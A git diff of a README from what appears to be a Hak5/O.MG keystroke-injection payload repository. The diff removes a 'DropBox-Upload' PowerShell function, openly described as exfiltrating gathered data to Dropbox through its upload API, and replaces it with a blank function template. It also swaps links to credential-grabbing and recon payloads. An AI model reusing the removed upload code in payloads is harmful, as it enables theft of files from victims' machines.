@@ -12,54 +12,21 @@
   </ol>
 </details>
 
-# DropBox-Upload
+# Name of your function
 
 ## Description
 
-This function is used to exfiltrate gathered data to DropBox 
+A short description of what your function accomplishes 
 
 ## The Function
 
-### [DropBox-Upload] 
+### [FUNCTION-NAME] 
 
-First off for this function to work you need to have a DropBox account. Make one [HERE](https://www.dropbox.com).
-
-Follow this [GUIDE](https://developers.dropbox.com/oauth-guide) for setting up your DropBox account for uploads
-
-
-
-Use the following syntax for your upload:
+A short description of how your function works
 
 ```
-DropBox-Upload -SourceFilePath "C:\Users\User\Desktop\file.txt"
-
-or
-
-"C:\Users\User\Desktop\file.txt" | DropBox-Upload
-```
-
-Make sure to plug in your newly aquired DropBox token in the $DropBoxAccessToken variable below
-
-```
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[string]$SourceFilePath
-) 
-
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"   # Replace with your DropBox Access Token
-$TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+function YOUR-FUNCTION {
+<Do the thing here>
 }
 ```
 
@@ -70,11 +37,10 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 (Examples of script that have used your function) - delete this line
 Listed below are payloads that have used one of these functions:
 
-[ADV-Recon](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ADV-Recon)
+[Acid Burn](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-AcidBurn)
 
-[ET-Phone-Home](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ET-Phone-Home)
+[JumpScare](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-JumpScare)
 
-[Credz-Plz](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Credz-Plz)
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -83,21 +49,21 @@ Listed below are payloads that have used one of these functions:
 
 <div><h2>I am Jakoby</h2></div>
   <p><br/>
-  
+
   <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
-  
+
   <a href="https://github.com/I-Am-Jakoby/">
     <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
   </a>
-  
+
   <a href="https://www.instagram.com/i_am_jakoby/">
     <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
   </a>
-  
+
   <a href="https://twitter.com/I_Am_Jakoby/">
     <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
   </a>
-  
+
   <a href="https://www.youtube.com/c/IamJakoby/">
     <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
   </a>
